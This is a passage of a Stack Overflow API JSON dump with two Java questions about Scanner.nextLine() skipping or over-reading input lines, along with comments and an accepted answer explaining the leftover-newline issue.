\t\t\t\t\t\tfemale = new JRadioButton(&quot;Female&quot;, true);\r\n    \t\t\t\t\t}\r\n    \t\t\t\t\tselectedGenderText.setText(scan.nextLine());\r\n    \t\t\t\t\tif(scan.next().toString() == &quot;Warrior&quot;)\r\n    \t\t\t\t\t{\r\n    \t\t\t\t\t\tuserClassBox.setSelectedItem(classes[0]);\r\n    \t\t\t\t\t}\r\n    \t\t\t\t\telse if(scan.next().toString() == &quot;Barbarian&quot;)\r\n    \t\t\t\t\t{\r\n    \t\t\t\t\t\tuserClassBox.setSelectedItem(classes[1]);\r\n    \t\t\t\t\t}\r\n    \t\t\t\t\telse if(scan.next().toString() == &quot;Mage&quot;)\r\n    \t\t\t\t\t{\r\n    \t\t\t\t\t\tuserClassBox.setSelectedItem(classes[2]);\r\n    \t\t\t\t\t}\r\n    \t\t\t\t\telse if(scan.next().toString() == &quot;Thief&quot;) \r\n    \t\t\t\t\t{\r\n    \t\t\t\t\t\tuserClassBox.setSelectedItem(classes[3]);\r\n    \t\t\t\t\t}\r\n    \t\t\t\t\tselectedClassText.setText(scan.nextLine());\r\n    \t\t\t\t\tpointsText.setText(scan.nextLine());\r\n    \t\t\t\t\tpointsSlider.setValue(Integer.parseInt(scan.nextLine()));\r\n    \t\t\t\t\tintelligenceText.setText(scan.nextLine());\r\n    \t\t\t\t\tintelligenceSlider.setValue(Integer.parseInt(scan.nextLine()));\r\n    \t\t\t\t\tdexterityText.setText(scan.nextLine());\r\n    \t\t\t\t\tdexteritySlider.setValue(Integer.parseInt(scan.nextLine()));\r\n    \t\t\t\t\tstrengthText.setText(scan.nextLine());\r\n    \t\t\t\t\tstrengthSlider.setValue(Integer.parseInt(scan.nextLine()));\r\n    \t\t\t\t\twisdomText.setText(scan.nextLine());\r\n    \t\t\t\t\twisdomSlider.setValue(Integer.parseInt(scan.nextLine()));\r\n    \t\t\t\t}\r\n\r\nMy input file has 15 lines to match the code above, \r\n\r\n    Warrior\r\n    Male\r\n    Male\r\n    Warrior\r\n    Warrior\r\n    0\r\n    0\r\n    10\r\n    10\r\n    30\r\n    30\r\n    60\r\n    60\r\n    0\r\n    0\r\n\r\nDo the if/else statements reference two new lines? When I run the program it gets stuck on the following line-\r\n\r\n    Exception in thread &quot;AWT-EventQueue-0&quot; java.util.NoSuchElementException: No line found\r\n    \tat java.util.Scanner.nextLine(Unknown Source)\r\n    \tat CharacterCreation$OpenCharListener.actionPerformed(CharacterCreation.java:450)\r\n    \tat javax.swing.AbstractButton.fireActionPerformed(Unknown Source)\r\n    \tat javax.swing.AbstractButton$Handler.actionPerformed(Unknown Source)\r\n    \tat javax.swing.DefaultButtonModel.fireActionPerformed(Unknown Source)\r\n\r\n\r\nThis reference the last two lines starting at -\r\n\r\n\t\t\t\t\twisdomText.setText(scan.nextLine());\r\n\t\t\t\t\twisdomSlider.setValue(Integer.parseInt(scan.nextLine()));\r\n\r\nWhy does the .nextLine() functionality look at 17 lines instead of 15?\r\n\r\n\r\n\r\n","title":"Scanner hasNext() doesn&#39;t match correctly inside if statements","body":"<p>I have created the following code through making a while loop. I cannot tell why the loop is set to look at 17 lines and not 15 lines.</p>\n\n<pre><code>while (scan.hasNext())\n                {           \n                    selectedUserName.setText(scan.next());\n                    if(scan.nextLine().toString() == \"Male\")\n                    {\n                        male = new JRadioButton(\"Male\", true);\n                    }\n                    else if(scan.nextLine().toString() == \"Female\")\n                    {\n                        female = new JRadioButton(\"Female\", true);\n                    }\n                    selectedGenderText.setText(scan.nextLine());\n                    if(scan.next().toString() == \"Warrior\")\n                    {\n                        userClassBox.setSelectedItem(classes[0]);\n                    }\n                    else if(scan.next().toString() == \"Barbarian\")\n                    {\n                        userClassBox.setSelectedItem(classes[1]);\n                    }\n                    else if(scan.next().toString() == \"Mage\")\n                    {\n                        userClassBox.setSelectedItem(classes[2]);\n                    }\n                    else if(scan.next().toString() == \"Thief\") \n                    {\n                        userClassBox.setSelectedItem(classes[3]);\n                    }\n                    selectedClassText.setText(scan.nextLine());\n                    pointsText.setText(scan.nextLine());\n                    pointsSlider.setValue(Integer.parseInt(scan.nextLine()));\n                    intelligenceText.setText(scan.nextLine());\n                    intelligenceSlider.setValue(Integer.parseInt(scan.nextLine()));\n                    dexterityText.setText(scan.nextLine());\n                    dexteritySlider.setValue(Integer.parseInt(scan.nextLine()));\n                    strengthText.setText(scan.nextLine());\n                    strengthSlider.setValue(Integer.parseInt(scan.nextLine()));\n                    wisdomText.setText(scan.nextLine());\n                    wisdomSlider.setValue(Integer.parseInt(scan.nextLine()));\n                }\n</code></pre>\n\n<p>My input file has 15 lines to match the code above, </p>\n\n<pre><code>Warrior\nMale\nMale\nWarrior\nWarrior\n0\n0\n10\n10\n30\n30\n60\n60\n0\n0\n</code></pre>\n\n<p>Do the if/else statements reference two new lines? When I run the program it gets stuck on the following line-</p>\n\n<pre><code>Exception in thread \"AWT-EventQueue-0\" java.util.NoSuchElementException: No line found\n    at java.util.Scanner.nextLine(Unknown Source)\n    at CharacterCreation$OpenCharListener.actionPerformed(CharacterCreation.java:450)\n    at javax.swing.AbstractButton.fireActionPerformed(Unknown Source)\n    at javax.swing.AbstractButton$Handler.actionPerformed(Unknown Source)\n    at javax.swing.DefaultButtonModel.fireActionPerformed(Unknown Source)\n</code></pre>\n\n<p>This reference the last two lines starting at -</p>\n\n<pre><code>                wisdomText.setText(scan.nextLine());\n                wisdomSlider.setValue(Integer.parseInt(scan.nextLine()));\n</code></pre>\n\n<p>Why does the .nextLine() functionality look at 17 lines instead of 15?</p>\n"},{"tags":["java","while-loop","io","java.util.scanner"],"comments":[{"owner":{"account_id":1263831,"reputation":388998,"user_id":1221571,"accept_rate":67,"display_name":"Eran"},"score":0,"creation_date":1523267217,"post_id":49729939,"comment_id":86473529,"body_markdown":"add a `scanner.nextLine()` before the loop.","body":"add a <code>scanner.nextLine()</code> before the loop."},{"owner":{"account_id":7300157,"reputation":3873,"user_id":7937498,"display_name":"Itoun"},"score":0,"creation_date":1523267319,"post_id":49729939,"comment_id":86473588,"body_markdown":"create the name String out of your loop and just assigne it to the return of the scanner.","body":"create the name String out of your loop and just assigne it to the return of the scanner."},{"owner":{"account_id":1816046,"reputation":1389,"user_id":1651107,"accept_rate":100,"display_name":"Piro"},"score":0,"creation_date":1523267733,"post_id":49729939,"comment_id":86473853,"body_markdown":"Possible duplicate of [Scanner is skipping nextLine() after using next() or nextFoo()?](https://stackoverflow.com/questions/13102045/scanner-is-skipping-nextline-after-using-next-or-nextfoo)","body":"Possible duplicate of <a href=\"https://stackoverflow.com/questions/13102045/scanner-is-skipping-nextline-after-using-next-or-nextfoo\">Scanner is skipping nextLine() after using next() or nextFoo()?</a>"}],"answers":[{"tags":[],"owner":{"account_id":121881,"reputation":20677,"user_id":315306,"accept_rate":90,"display_name":"Raffaele"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1523268281,"creation_date":1523268281,"answer_id":49730360,"question_id":49729939,"body_markdown":"If you read `numHeroes` with `Scanner.nextInt` a newline character remains in its buffer and thus an empty string is returned by the following `Scanner.nextLine`, effectively resulting in a sequence of two consecutive `Scanner.nextLine()` to get the first hero name.\r\n\r\nIn the following code I suggest you read the number of heroes with `Integer.parseInt(scanner.nextLine)` and, as a matter of style, don&#39;t use a local variable `count` since it&#39;s implicitely bound to the size of the `heroNames` collection:\r\n\r\n    Scanner scanner = new Scanner(System.in);\r\n    List&lt;String&gt; heroNames = new ArrayList&lt;&gt;();\r\n\r\n    int numHeroes;\r\n\r\n    System.out.println(&quot;How many heroes do you want to play with?&quot;);\r\n    \r\n    while (true) {\r\n        try {\r\n            numHeroes = Integer.parseInt(scanner.nextLine());\r\n            break;\r\n        } catch (NumberFormatException e) {\r\n            // continue\r\n        }\r\n    }\r\n\r\n    while (heroNames.size() &lt; numHeroes) {\r\n        System.out.println(&quot;Type hero name (&quot;\r\n                + (numHeroes - heroNames.size()) + &quot;/&quot; + numHeroes + &quot; missing):&quot;);\r\n        String name = scanner.nextLine();\r\n        if (heroNames.contains(name)) {\r\n            System.out.println(name + &quot; already given. Type a different one:&quot;);\r\n        } else if (name != null &amp;&amp; !name.isEmpty()) {\r\n            heroNames.add(name);\r\n        }\r\n    }\r\n    \r\n    System.out.println(&quot;Hero names: &quot; + heroNames);","title":"Java while loop skips first iteration for user input","body":"<p>If you read <code>numHeroes</code> with <code>Scanner.nextInt</code> a newline character remains in its buffer and thus an empty string is returned by the following <code>Scanner.nextLine</code>, effectively resulting in a sequence of two consecutive <code>Scanner.nextLine()</code> to get the first hero name.</p>\n\n<p>In the following code I suggest you read the number of heroes with <code>Integer.parseInt(scanner.nextLine)</code> and, as a matter of style, don't use a local variable <code>count</code> since it's implicitely bound to the size of the <code>heroNames</code> collection:</p>\n\n<pre><code>Scanner scanner = new Scanner(System.in);\nList&lt;String&gt; heroNames = new ArrayList&lt;&gt;();\n\nint numHeroes;\n\nSystem.out.println(\"How many heroes do you want to play with?\");\n\nwhile (true) {\n    try {\n        numHeroes = Integer.parseInt(scanner.nextLine());\n        break;\n    } catch (NumberFormatException e) {\n        // continue\n    }\n}\n\nwhile (heroNames.size() &lt; numHeroes) {\n    System.out.println(\"Type hero name (\"\n            + (numHeroes - heroNames.size()) + \"/\" + numHeroes + \" missing):\");\n    String name = scanner.nextLine();\n    if (heroNames.contains(name)) {\n        System.out.println(name + \" already given. Type a different one:\");\n    } else if (name != null &amp;&amp; !name.isEmpty()) {\n        heroNames.add(name);\n    }\n}\n\nSystem.out.println(\"Hero names: \" + heroNames);\n</code></pre>\n"}],"owner":{"account_id":13325588,"reputation":3,"user_id":9618628,"display_name":"Flynn Lange"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1521,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":49730360,"answer_count":1,"score":0,"last_activity_date":1683709415,"creation_date":1523266948,"question_id":49729939,"body_markdown":"I am making a game and currently I need to set the names for the &#39;heroes&#39;! This requires the player to enter a name for the heroes. \r\nThe thing is, when it asks for the name of hero 1 in the console, it just skips over and goes straight to hero 2. \r\nIf I use  .next() instead of .nextLine(), it works, but it interpreted any names with a space in them as two different names!\r\n\r\nHere is the code, I hope that make sense! Thanks all in advance :)\r\n\r\n    public void heroNames() //sets the name of heroes\r\n\t{\r\n\t\tint count = 1;\r\n\t\twhile (count &lt;= numHeroes)\r\n\t\t{\r\n\t\t\tSystem.out.println(&quot;Enter a name for hero number &quot; + count);\r\n\t\t\tString name = scanner.nextLine(); \r\n\t\t\tif(heroNames.contains(name)) //bug needs to be fixed here - does not wait for user input for first hero name\r\n\t\t\t{\r\n\t\t\t\tSystem.out.println(&quot;You already have a hero with this name. Please choose another name!&quot;);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\theroNames.add(name);\r\n\t\t\t\tcount++; //increases count by 1 to move to next hero\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n ","title":"Java while loop skips first iteration for user input","body":"<p>I am making a game and currently I need to set the names for the 'heroes'! This requires the player to enter a name for the heroes. \nThe thing is, when it asks for the name of hero 1 in the console, it just skips over and goes straight to hero 2. \nIf I use  .next() instead of .nextLine(), it works, but it interpreted any names with a space in them as two different names!</p>\n\n<p>Here is the code, I hope that make sense! Thanks all in advance :)</p>\n\n<pre><code>public void heroNames() //sets the name of heroes\n{\n    int count = 1;\n    while (count &lt;= numHeroes)\n    {\n        System.out.println(\"Enter a name for hero number \" + count);\n        String name = scanner.nextLine(); \n        if(heroNames.contains(name)) //bug needs to be fixed here - does not wait for user input for first hero name\n        {\n            System.out.println(\"You already have a hero with this name. Please choose another name!\");\n        }\n        else\n        {\n            heroNames.add(name);\n            count++; //increases count by 1 to move to next hero\n        }\n    }\n}\n</code></pre>\n"}],"has_more":true,"quota_max":10000,"quota_remaining":9548,"page":444,"page_size":100}
